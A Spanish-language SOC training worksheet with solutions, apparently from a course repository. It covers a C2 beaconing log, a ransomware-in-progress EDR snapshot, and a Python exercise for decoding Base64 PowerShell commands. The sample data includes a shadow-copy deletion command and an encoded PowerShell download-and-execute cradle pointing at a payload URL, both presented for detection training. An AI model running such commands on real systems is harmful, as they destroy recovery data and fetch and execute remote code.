# 🟡 Nivel 2 — Medio

Ejercicios que requieren análisis más profundo. Algunos necesitan código Python.
Herramientas: CyberChef, Python, Wireshark (capturas simuladas)

---

## Ejercicio 2.1 — Análisis de tráfico TLS sospechoso

El SIEM alerta sobre tráfico inusual desde `WORKSTATION-04` (192.168.10.44). Tenés los siguientes datos del log de red:

```
Timestamp: 2024-01-15 03:42:17 UTC
src_ip: 192.168.10.44
dst_ip: 45.89.123.201
dst_port: 443
protocol: TLS 1.2
sni: update.microsoft-cdn.net
tls_cert_issuer: CN=update.microsoft-cdn.net
tls_cert_subject: CN=update.microsoft-cdn.net
tls_cert_not_before: 2024-01-14
tls_cert_not_after: 2025-01-14
ja3_hash: 51c64c77e60f3980cac67a39d26b2f47
connection_interval: [303s, 301s, 299s, 302s, 300s, 301s]
bytes_sent: [842, 839, 841, 843, 840, 842]
```

**Preguntas:**
1. Listá todos los red flags que ves en estos datos
2. ¿Qué técnica(s) de evasión está usando el atacante?
3. ¿Es legítimo el dominio `update.microsoft-cdn.net`? ¿Cómo lo verificarías?
4. ¿Qué acciones tomarías en el SOC?
5. ¿A qué técnica MITRE ATT&CK corresponde este patrón?

<details>
<summary>💡 Pistas</summary>

- Un certificado autofirmado tiene issuer == subject
- El beaconing tiene un patrón de tiempo muy regular
- JA3 51c64c77... está asociado a una herramienta conocida
- Los dominios de Microsoft tienen patrones de nomenclatura conocidos

</details>

<details>
<summary>✅ Solución</summary>

**1. Red flags:**
- ❌ **Certificado autofirmado**: issuer = subject = `CN=update.microsoft-cdn.net` (nadie firmó su cert)
- ❌ **JA3 51c64c77e60f3980cac67a39d26b2f47**: conocido como fingerprint de **Cobalt Strike**
- ❌ **Beaconing exacto**: intervalos ~300 segundos con stddev < 2s → C2 beacon configurado a 5 min
- ❌ **Bytes enviados uniformes**: 840±3 bytes → posible padding para enmascarar el beacon
- ❌ **Hora**: 03:42 UTC → fuera de horario laboral normal
- ⚠️ **Dominio sospechoso**: `microsoft-cdn.net` ≠ dominios reales de Microsoft (usan `microsoft.com`, `windows.net`, `azure.com`)

**2. Técnicas de evasión:**
- **Domain spoofing / Typosquatting**: dominio que parece Microsoft pero no lo es
- **HTTPS para C2**: ocultar tráfico C2 detrás de TLS
- **Jitter mínimo en beaconing**: intentar parecer tráfico regular

**3. Verificación del dominio:**
- `nslookup update.microsoft-cdn.net` → ¿resuelve a IP conocida de Microsoft?
- `whois microsoft-cdn.net` → fecha de registro (reciente = sospechoso)
- Los dominios legítimos de MS: *.microsoft.com, *.windows.net, *.azure.com, *.office.com

**4. Acciones SOC:**
1. Aislar WORKSTATION-04 de la red
2. Bloquear IP 45.89.123.201 en firewall
3. Hacer dump de memoria del endpoint
4. Investigar proceso que genera las conexiones (EDR)
5. Buscar el mismo JA3 en otros endpoints (hunting)
6. Escalar a IR team

**5. MITRE ATT&CK:**
- T1071.001 — Application Layer Protocol: Web Protocols (C2 sobre HTTPS)
- T1568 — Dynamic Resolution (si el dominio cambia)
- T1102 — no aplica aquí
- T1090.002 — External Proxy (posible)
- Cobalt Strike en sí: S0154

</details>

---

## Ejercicio 2.2 — Análisis de ransomware en progreso

Un analista L1 escala una alerta porque detectó comportamiento anómalo en FILE-SERVER-01. Tenés estos datos del EDR:

```
Proceso: explorer.exe → lanzó → cmd.exe → lanzó → svchost32.exe
svchost32.exe PID: 4821
Tiempo activo: 00:08:32

Actividad en disco (últimos 5 minutos):
  - Archivos leídos: 8,412
  - Archivos escritos: 8,410
  - Extensiones modificadas: .docx → .docx.LOCKED (8,410 casos)
  - Archivos creados: "HOW_TO_DECRYPT.txt" (encontrado en 847 directorios)

Red:
  - Conexión HTTPS establecida: 45.123.45.67:443 (hace 2 minutos)
  - Datos enviados: 2.4 KB

Shadow Copies: eliminadas (vssadmin delete shadows /all /quiet hace 3 min)
Hora: 02:17 (domingo a la madrugada)
```

**Preguntas:**
1. ¿Está en progreso el ransomware? ¿Cómo lo sabés?
2. ¿Qué criptografía está usando probablemente?
3. Los 2.4 KB enviados al C2, ¿qué contienen probablemente?
4. ¿Qué hacés en el próximo minuto?
5. ¿Es posible recuperación sin pagar? ¿Qué factores evaluarías?

<details>
<summary>✅ Solución</summary>

**1. Sí, está en progreso:**
- 8,410 archivos renombrados con extensión .LOCKED = cifrado activo
- HOW_TO_DECRYPT.txt creado en 847 directorios = ransomnote creada
- Shadow copies eliminadas = anti-recovery
- Proceso anómalo: `svchost32.exe` (el real no tiene "32")

**2. Criptografía probable:**
- AES-256-CBC o AES-256-CTR para cifrar archivos (velocidad + seguridad)
- RSA-2048 o RSA-4096 para proteger la clave AES
- Patrón estándar: AES file encryption + RSA key protection

**3. Los 2.4 KB enviados al C2 contienen probablemente:**
- La clave AES cifrada con RSA pública del atacante
- Identificador único de víctima
- Posiblemente información del sistema (nombre, dominio, IPs)
- Los 2.4 KB es consistente: clave AES (32 bytes) + RSA-2048 output (256 bytes) + metadata

**4. Próximo minuto:**
1. **Aislar FILE-SERVER-01 de red INMEDIATAMENTE** (cortar switch port / desconectar NIC)
   - Evitar que el cifrado llegue a más shares montados
   - Cortar comunicación con C2
2. **NO apagar** — preservar la clave AES que podría estar en RAM
3. Hacer snapshot de VM si es virtual
4. Contactar al IR team
5. Verificar otros servidores con shares: ¿están siendo afectados?

**5. Posibilidad de recuperación:**
- ✅ Verificar: ¿hay backups offline previos al incidente?
- ✅ Verificar: ¿es una familia con decryptor conocido? (nomoreransom.org)
- ✅ Dump de RAM: ¿está la clave AES en memoria? (WinPmem, FTK Imager Live)
- ✅ ¿Solo cifró parcialmente? (algunos ransomware solo cifran los primeros KB)
- ❌ Si todo falla y no hay backups: sin clave RSA privada del atacante → sin recuperación
- Pago: último recurso, no garantiza recovery, financia al atacante

</details>

---

## Ejercicio 2.3 — Código Python: Detectar payloads Base64

Escribí un script Python que:
1. Lea un archivo de texto con múltiples líneas
2. Detecte strings que podrían ser Base64
3. Intente decodificarlos
4. Reporte cuáles podrían ser payloads de PowerShell

**Input de prueba (guardar como `input_malicioso.txt`):**
```
2024-01-15 03:41:00 - Usuario logueado: CORP\jsmith
2024-01-15 03:42:17 - Proceso: powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
2024-01-15 03:42:18 - Hash de archivo: d41d8cd98f00b204e9800998ecf8427e
2024-01-15 03:42:20 - Proceso: cmd.exe /c whoami
2024-01-15 03:43:00 - Proceso: powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABhAGMAawBlAGQAIgA=
```

<details>
<summary>💡 Pistas</summary>

```python
import re, base64

patron_enc = re.compile(r'-e(?:nc|ncodedcommand)\s+([A-Za-z0-9+/=]{20,})', re.IGNORECASE)

for linea in lines:
    match = patron_enc.search(linea)
    if match:
        try:
            decoded = base64.b64decode(match.group(1)).decode('utf-16-le')
            print(f"DECODED: {decoded}")
        except:
            pass
```

</details>

<details>
<summary>✅ Solución completa</summary>

```python
import re
import base64

def analizar_logs(contenido):
    patron_enc = re.compile(
        r'-e(?:nc(?:odedcommand)?)\s+([A-Za-z0-9+/=]{20,})',
        re.IGNORECASE
    )
    
    alertas = []
    for i, linea in enumerate(contenido.splitlines(), 1):
        match = patron_enc.search(linea)
        if match:
            b64 = match.group(1)
            try:
                decoded = base64.b64decode(b64).decode('utf-16-le')
                alertas.append({
                    'linea': i,
                    'b64': b64[:30] + '...',
                    'decoded': decoded
                })
            except Exception as e:
                alertas.append({'linea': i, 'error': str(e)})
    return alertas

# Resultado esperado:
# Línea 2: iex (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')
# Línea 5: Write-Host "Hacked"
```

</details>

---

*Continuá con: [nivel_3_dificil.md](./nivel_3_dificil.md)*
